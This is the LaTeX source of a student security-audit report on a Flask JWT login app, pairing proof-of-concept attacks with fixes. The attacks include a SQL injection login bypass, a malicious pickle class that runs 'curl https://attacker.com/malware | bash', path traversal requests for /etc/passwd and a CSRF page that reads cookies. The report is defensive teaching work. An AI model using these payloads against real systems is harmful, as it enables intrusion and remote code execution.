\documentclass[11pt,a4paper]{article}

% Packages
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{microtype}
\usepackage{graphicx}
\usepackage{xcolor}
\usepackage{booktabs}
\usepackage{listings}
\usepackage{hyperref}
\usepackage{enumitem}
\usepackage[margin=1in]{geometry}
\usepackage{fancyhdr}
\usepackage{tcolorbox}
\usepackage{titlesec}

\usepackage{graphicx}     % For images
\usepackage{eso-pic}      % For background image
\usepackage{transparent}

% Colors
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.95}
\definecolor{criticalcolor}{rgb}{0.8,0.1,0.1}
\definecolor{highcolor}{rgb}{0.9,0.5,0.1}
\definecolor{mediumcolor}{rgb}{0.9,0.9,0.1}
\definecolor{fixedcolor}{rgb}{0.1,0.7,0.1}
\definecolor{codeboring}{rgb}{0.8,0.5,0.5}

% Listings settings
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}
\lstset{style=mystyle}

% Header and footer
\pagestyle{fancy}
\fancyhf{}
\fancyhead[L]{JWT Authentication Security Audit}
\fancyhead[R]{\thepage}
\fancyfoot[C]{CONFIDENTIAL}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0.4pt}

% Title formatting
\titleformat{\section}
  {\normalfont\Large\bfseries}{\thesection}{1em}{}
\titleformat{\subsection}
  {\normalfont\large\bfseries}{\thesubsection}{1em}{}

% Custom environment for vulnerabilities
\newenvironment{vulnerability}[3]{%
    \begin{tcolorbox}[
        colback=white,
        colframe=#1,
        fonttitle=\bfseries\color{white},
        coltitle=#1,
        title=#2: #3
    ]
}{%
    \end{tcolorbox}
}

\hypersetup{
    colorlinks=true,
    linkcolor=blue,
    filecolor=magenta,      
    urlcolor=cyan,
    pdftitle={JWT Authentication Security Audit Report},
    pdfpagemode=FullScreen,
}

\begin{document}

\begin{titlepage}

\AddToShipoutPictureBG*{%
    \AtPageLowerLeft{
     \transparent{0.15}
        \includegraphics[width=800,height=900]{s.jpg}
    }
}
    \centering
    \vspace*{8cm}
    % \includegraphics[width=0.4\textwidth]{example-image}\\[1cm]
    {\Huge\bfseries Assignment 2 - Defensive coding report\\}
    \vspace{1.5cm}
    % {\Large\textbf{CONFIDENTIAL(Only for Mr Aman and Mr Tayebi's eyes)}}\\
    \vspace{1cm}
    % {\large\today}\\
    \vfill
    {\large Prepared for:\\
    Mr. Tayebi and Aman\\}
    \vspace{0.5cm}
    {\large Prepared by:\\
    Group 2(Jugal, Puru, Gitanshu, Sarthak, Adit, Prasana)\\}
\end{titlepage}

\tableofcontents
\newpage

\section{Executive Summary}

This report documents a comprehensive security audit of a Flask-based authentication system implementing JWT (JSON Web Tokens). The audit identified multiple critical and high-severity vulnerabilities that could lead to unauthorized access, data breaches, and server compromise. Each vulnerability has been analyzed with proof-of-concept examples and appropriate remediation strategies.

\subsection{Vulnerabilities Overview}

\begin{table}[h]
\centering
\begin{tabular}{clccc}
\toprule
\textbf{ID} & \textbf{Vulnerability} & \textbf{Severity} & \textbf{Impact} & \textbf{Status} \\
\midrule
V1 & SQL Injection & \textcolor{criticalcolor}{Critical} & Authentication bypass, data exposure & \textcolor{fixedcolor}{Fixed} \\
V2 & Insecure Deserialization (Pickle) & \textcolor{criticalcolor}{Critical} & Remote code execution & \textcolor{fixedcolor}{Fixed} \\
V3 & Client-side Privilege Control & \textcolor{highcolor}{High} & Privilege escalation & \textcolor{fixedcolor}{Fixed} \\
V4 & JWT Implementation Flaws & \textcolor{highcolor}{High} & Token forgery, authentication bypass & \textcolor{fixedcolor}{Fixed} \\
V5 & Path Traversal & \textcolor{highcolor}{High} & Unauthorized file access & \textcolor{fixedcolor}{Fixed} \\
V6 & Missing Security Headers & \textcolor{mediumcolor}{Medium} & Various client-side attacks & \textcolor{fixedcolor}{Fixed} \\
V7 & Plaintext Password Storage & \textcolor{mediumcolor}{Medium} & Credential exposure & \textcolor{fixedcolor}{Fixed} \\
V8 & Dependency Vulnerabilities & \textcolor{codeboring}{Low} & Cookie Information Vulnerable & \textcolor{fixedcolor}{Fixed} \\
\bottomrule
\end{tabular}
\caption{Summary of identified vulnerabilities}
\label{tab:vuln_summary}
\end{table}

\section{Detailed Findings}

\subsection{V1: SQL Injection}

\begin{vulnerability}{criticalcolor}{Critical}{SQL Injection}
\subsubsection*{Description}
The application uses string interpolation to construct SQL queries with user-supplied input, allowing attackers to inject malicious SQL code.

\subsubsection*{Proof of Concept}
An attacker could login with the following credentials:

\begin{lstlisting}[language={}]
Username: admin' --
Password: anything
\end{lstlisting}

This produces the following vulnerable SQL query:

\begin{lstlisting}[language=SQL]
SELECT * FROM users where username='admin' --' AND password='anything'
\end{lstlisting}

The \texttt{--} comments out the password check, allowing authentication as any user without knowing their password.

\subsubsection*{Impact}
\begin{itemize}
    \item Authentication bypass
    \item Data exfiltration
    \item Potential database destruction
\end{itemize}

\subsubsection*{Remediation}
Implemented parameterized queries to prevent SQL injection:

\begin{lstlisting}[language=Python]
# Original vulnerable code
rows = db.fetch_data(f"SELECT * FROM users where username='{username}' AND password='{password}'")

# Fixed code
user = db.fetch_data("SELECT * FROM users WHERE username = ?", (username,))
\end{lstlisting}
\end{vulnerability}

\subsection{V2: Insecure Deserialization (Pickle)}

\begin{vulnerability}{criticalcolor}{Critical}{Insecure Deserialization}
\subsubsection*{Description}
The application uses Python's \texttt{pickle} module to serialize and deserialize JWT tokens. Pickle deserialization of untrusted data allows attackers to execute arbitrary code on the server.

\subsubsection*{Proof of Concept}
An attacker could craft a malicious pickle payload:

\begin{lstlisting}[language=Python]
import pickle
import os
import base64

class EvilPickle:
    def __reduce__(self):
        return (os.system, ('curl https://attacker.com/malware | bash',))

# Create malicious pickle
malicious = pickle.dumps(EvilPickle())
hex_payload = malicious.hex()

# Split like in the application logic
obfuscated = hex_payload[len(hex_payload)//2:] + hex_payload[:len(hex_payload)//2]

# The attacker would then set this as their token cookie
\end{lstlisting}

When the server deserializes this data with \texttt{pickle.loads()}, it executes the attacker's command.

\subsubsection*{Impact}
\begin{itemize}
    \item Remote code execution
    \item Complete server compromise
    \item Data breach
\end{itemize}

\subsubsection*{Remediation}
Removed pickle serialization entirely and used standard JWT encoding/decoding:

\begin{lstlisting}[language=Python]
# Original vulnerable code
token = auth_token[len(auth_token)//2:] + auth_token[:len(auth_token)//2]
data = jwt.decode(pickle.loads(bytes.fromhex(token)), SECRET_KEY, algorithms=["HS256"])

# Fixed code
payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
\end{lstlisting}
\end{vulnerability}

\subsection{V3: Client-side Privilege Control}

\begin{vulnerability}{highcolor}{High}{Client-side Privilege Control}
\subsubsection*{Description}
The application sets an 'admin' cookie on the client-side to control administrative access, allowing attackers to modify this value and escalate privileges.

\subsubsection*{Proof of Concept}
An attacker could:
\begin{enumerate}
    \item Login as a regular user
    \item Intercept the response using a web proxy
    \item Modify the 'admin' cookie value from 'false' to 'true'
    \item Access administrative functions
\end{enumerate}

\begin{lstlisting}[language=http]
POST /login HTTP/1.1
Host: example.com
Content-Type: application/json

{"username":"user1","password":"password1"}

# Response (intercepted and modified)
HTTP/1.1 200 OK
Set-Cookie: token=eyJ0eXA...
Set-Cookie: admin=true  <- Modified from 'false' to 'true'
\end{lstlisting}

\subsubsection*{Impact}
\begin{itemize}
    \item Privilege escalation
    \item Unauthorized access to admin functionality
    \item File system access
\end{itemize}

\subsubsection*{Remediation}
Removed client-controlled admin flag and stored privileges in the JWT token, verified server-side:

\begin{lstlisting}[language=Python]
# JWT payload now includes privilege level
token = jwt.encode({
    'username': username,
    'privilege': user[0][3],
    'exp': expiration
}, SECRET_KEY, algorithm="HS256")

# Access control check
if current_user['privilege'] != 1:
    return jsonify({"error": "Admin access required"}), 403
\end{lstlisting}
\end{vulnerability}

\subsection{V4: JWT Implementation Flaws}

\begin{vulnerability}{highcolor}{High}{JWT Implementation Flaws}
\subsubsection*{Description}
The JWT implementation had multiple flaws:
\begin{itemize}
    \item Static, hardcoded secret key
    \item No token expiration
    \item Insecure storage in cookies
    \item Unnecessary and ineffective obfuscation
\end{itemize}

\subsubsection*{Proof of Concept}
An attacker could extract and decode a valid JWT token, modify its contents, and re-encode it:

\begin{lstlisting}[language=Python]
# Decode obfuscated token
obfuscated_token = "a7c6b5d4e3f2...1234"  # From cookie

token_hex = obfuscated_token[len(obfuscated_token)//2:] + obfuscated_token[:len(obfuscated_token)//2]
token_bytes = bytes.fromhex(token_hex)
token = pickle.loads(token_bytes).decode()

# Decode JWT
payload = jwt.decode(token, "secret_key", algorithms=["HS256"])

# Modify payload
payload["username"] = "admin1"  # Escalate to admin

# Re-encode
new_token = jwt.encode(payload, "secret_key", algorithm="HS256")

# Re-obfuscate
new_bytes = pickle.dumps(new_token.encode())
new_hex = new_bytes.hex()
new_obfuscated = new_hex[len(new_hex)//2:] + new_hex[:len(new_hex)//2]
\end{lstlisting}
\subsubsection*{Impact}
\begin{itemize}
    \item Identity spoofing
    \item Privilege escalation
    \item Session hijacking
\end{itemize}



\end{vulnerability}

\begin{vulnerability}{highcolor}{High}{JWT Implementation Flaws}
\subsubsection*{Remediation}
Implemented proper JWT security practices:
    \begin{lstlisting}[language=Python]
# Generate cryptographically secure random key
SECRET_KEY = secrets.token_hex(32)  # 256 bits of entropy

# Add expiration time
expiration = datetime.utcnow() + timedelta(hours=1)
token = jwt.encode({
    'username': username,
    'privilege': user[0][3],
    'exp': expiration
}, SECRET_KEY, algorithm="HS256")

# Secure cookie settings
res.set_cookie(
    "token", 
    value=token, 
    httponly=True,
    secure=True,
    samesite='Strict',
    max_age=3600
)
\end{lstlisting}
\end{vulnerability}
\subsection{V5: Path Traversal}

\begin{vulnerability}{highcolor}{High}{Path Traversal}
\subsubsection*{Description}
The file storage implementation doesn't sanitize filenames, allowing attackers to access files outside the intended directory.

\subsubsection*{Proof of Concept}
An attacker with admin access could:

\begin{lstlisting}[language=http]
POST /file HTTP/1.1
Host: example.com
Cookie: token=valid_admin_token; admin=true
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="../../../etc/passwd"
Content-Type: text/plain

(file content)
-----------------------------1234567890--
\end{lstlisting}

This could write files outside the intended directory or overwrite system files.

Similarly, an attacker could read sensitive files:

\begin{lstlisting}[language=http]
GET /file?filename=../../../etc/passwd HTTP/1.1
Host: example.com
Cookie: token=valid_token
\end{lstlisting}

\subsubsection*{Impact}
\begin{itemize}
    \item Unauthorized access to system files
    \item Information disclosure
    \item Potential system compromise
\end{itemize}

\subsubsection*{Remediation}
Implemented proper path sanitization and validation:

\begin{lstlisting}[language=Python]
# Sanitize filename to prevent path traversal
safe_filename = os.path.basename(filename)
file_path = os.path.join(self.storage_directory, safe_filename)

# Additional validation to prevent directory traversal
if not os.path.abspath(file_path).startswith(os.path.abspath(self.storage_directory)):
    raise ValueError("Invalid file path")
\end{lstlisting}
\end{vulnerability}

\subsection{V6: Missing Security Headers}

\begin{vulnerability}{mediumcolor}{Medium}{Missing Security Headers}
\subsubsection*{Description}
The application lacks security headers for cookie protection and does not implement CSRF protections.

\subsubsection*{Proof of Concept}
An attacker could create a malicious website that makes requests to the vulnerable application:

\begin{lstlisting}[language=html]
<html>
<body>
<script>
  // This script can access non-HttpOnly cookies
  document.write("Your token: " + document.cookie);
  
  // CSRF attack to delete files if user is admin
  fetch('https://vulnerable-app.com/file?filename=important.txt', {
    method: 'DELETE',
    credentials: 'include'  // Sends cookies
  });
</script>
</body>
</html>
\end{lstlisting}

\subsubsection*{Impact}
\begin{itemize}
    \item Cross-site scripting (XSS)
    \item Cross-site request forgery (CSRF)
    \item Cookie theft
\end{itemize}

\subsubsection*{Remediation}
Added proper security attributes to cookies:

\begin{lstlisting}[language=Python]
res.set_cookie(
    "token", 
    value=token, 
    httponly=True,          # Prevents JavaScript access
    secure=True,            # Only transmitted over HTTPS
    samesite='Strict',      # CSRF protection
    max_age=3600            # 1 hour expiration
)
\end{lstlisting}
\end{vulnerability}

\subsection{V7: Plaintext Password Storage}

\begin{vulnerability}{mediumcolor}{Medium}{Plaintext Password Storage}
\subsubsection*{Description}
The application stores user passwords in plaintext, risking credential exposure in case of a data breach.

\subsubsection*{Proof of Concept}
If an attacker gains access to the database, they can directly read user passwords:

\begin{lstlisting}[language=SQL]
SELECT username, password FROM users;
\end{lstlisting}

Results:
\begin{lstlisting}
username | password
---------|-----------
user1    | password1
admin1   | adminpassword1
\end{lstlisting}

\subsubsection*{Impact}
\begin{itemize}
    \item Credential exposure
    \item Account takeover
    \item Password reuse attacks
\end{itemize}

\subsubsection*{Remediation}
Implemented password hashing:

\begin{lstlisting}[language=Python]
# During user creation
hashed_password1 = generate_password_hash('password1')
db.update_data("INSERT INTO users (username, password, privilege) VALUES (?, ?, ?)", 
              ('user1', hashed_password1, 0))

# During authentication
if not user or not check_password_hash(user[0][2], password):
    return jsonify({"error": "Invalid credentials"}), 401
\end{lstlisting}
\end{vulnerability}

\subsection{Dependency Vulnerabilities}

\begin{vulnerability}{codeboring}{Medium}{Dependencies Vulnerabilities}
\subsubsection*{Description}
Flask 2.2.2 – vulnerable to information exposure in the form of permanent session cookie when the following conditions are met:

Werkzeug 2.2.2 – Affected by multiple high level vulnerabilities causing Denial of Service, Remote code execution, path traversal. For more info: refer this link .
\\
\subsection*{Proof of Concept}
\begin{itemize}
    \item The application is hosted behind a caching proxy that does not strip cookies or ignore responses with cookies.
\item The application sets session.permanent = True.
\item The application does not access or modify the session at any point during a request.
\item SESSION\_REFRESH\_EACH\_REQUEST is enabled (the default).
\item The application does not set a Cache-Control header to indicate that a page is private or should not be cached.
\end{itemize}
\subsection*{Impact}
A response containing data intended for one client may be cached and sent to other clients. If the proxy also caches Set-Cookie headers, it may send one client's session cookie to other clients. Under these conditions, the Vary: Cookie header is not set when a session is refreshed (re-sent to update the expiration) without being accessed or modified.
\subsection*{Remediation}
Recommendation: Upgrade flask to version 2.2.5, 2.3.2 or higher and werkzeug to 2.5.2 or higher in requirements.txt.
\begin{lstlisting}[language=Python]
flask>=2.3.2
werkzeug>=2.5.2
\end{lstlisting}
\end{vulnerability}


\vspace{2300pt}
\section{Complete Code Review}

The following is a comprehensive analysis of the fixed code, highlighting the security improvements made to address the vulnerabilities identified in this report.

\subsection{Authentication Flow}

\begin{lstlisting}[language=Python]
@app.route("/login", methods=["POST"])
def login():
    if not request.is_json:
        return jsonify({"error": "Missing JSON in request"}), 400
        
    username = request.json.get("username")
    password = request.json.get("password")
    
    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400
    
    # Use parameterized query to prevent SQL injection
    user = db.fetch_data("SELECT * FROM users WHERE username = ?", (username,))
    
    if not user or not check_password_hash(user[0][2], password):
        return jsonify({"error": "Invalid credentials"}), 401
    
    # Create token with expiration
    expiration = datetime.utcnow() + timedelta(hours=1)
    token = jwt.encode({
        'username': username,
        'privilege': user[0][3],
        'exp': expiration
    }, SECRET_KEY, algorithm="HS256")
    
    res = make_response(jsonify({"message": "Login successful"}))
    
    # Set secure cookie
    res.set_cookie(
        "token", 
        value=token, 
        httponly=True,          # Prevents JavaScript access
        secure=True,            # Only transmitted over HTTPS
        samesite='Strict',      # CSRF protection
        max_age=3600            # 1 hour expiration
    )
    
    return res
\end{lstlisting}

\subsection{Authentication Middleware}

\begin{lstlisting}[language=Python]
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.cookies.get('token')
        
        if not token:
            return jsonify({'message': 'Token is missing'}), 401
            
        try:
            # Decode JWT token
            payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
            # Get the current user from the database
            user = db.fetch_data("SELECT * FROM users WHERE username = ?", (payload['username'],))
            
            if not user:
                return jsonify({'message': 'Invalid token'}), 401
                
            # Add user data to the request context
            request.current_user = {
                'username': user[0][1],
                'privilege': user[0][3]
            }
        except jwt.ExpiredSignatureError:
            return jsonify({'message': 'Token has expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'message': 'Invalid token'}), 401
            
        return f(*args, **kwargs)
    return decorated
\end{lstlisting}

\subsection{File Operations}

\begin{lstlisting}[language=Python]
@app.route("/file", methods=["GET", "POST", "DELETE"])
@token_required
def store_file():
    """
    Only admins can upload/delete files.
    All users can read files.
    """
    current_user = request.current_user
    
    if request.method == 'GET':
        filename = request.args.get('filename')
        if not filename:
            return jsonify({"error": "Filename is required"}), 400
            
        content = fs.get(filename)
        if content is None:
            return jsonify({"error": "File not found"}), 404
            
        response = make_response(content)
        response.headers.set('Content-Type', 'application/octet-stream')
        response.headers.set('Content-Disposition', f'attachment; filename={os.path.basename(filename)}')
        return response
        
    elif request.method == 'POST':
        if current_user['privilege'] != 1:
            return jsonify({"error": "Admin access required"}), 403
            
        if 'file' not in request.files:
            return jsonify({"error": "No file part"}), 400
            
        uploaded_file = request.files['file']
        if uploaded_file.filename == '':
            return jsonify({"error": "No selected file"}), 400
            
        try:
            fs.store(uploaded_file.filename, uploaded_file.read())
            return jsonify({"message": f"File {uploaded_file.filename} uploaded successfully"})
        except ValueError as e:
            return jsonify({"error": str(e)}), 400
\end{lstlisting}

\section{Conclusion}

The application contained multiple critical security vulnerabilities that could lead to complete system compromise. The remediated code addresses these issues by implementing security best practices:

\begin{enumerate}
    \item Parameterized queries to prevent SQL injection
    \item Removal of insecure deserialization via pickle
    \item Server-side privilege verification
    \item Secure JWT implementation with proper token validation
    \item Strict path validation to prevent directory traversal
    \item Secure cookie configuration
    \item Password hashing
\end{enumerate}

These changes significantly improve the security posture of the application. Regular security testing is recommended to maintain this improved security stance.

\section{Recommendations}

\begin{enumerate}
    \item Implement a proper secret management solution rather than generating the secret key on application startup
    \item Add rate limiting for login attempts to prevent brute force attacks
    \item Implement logging for security events
    \item Consider adding multi-factor authentication for administrative access
    \item Implement Content Security Policy headers
    \item Conduct regular security code reviews and penetration testing
\end{enumerate}


\end{document}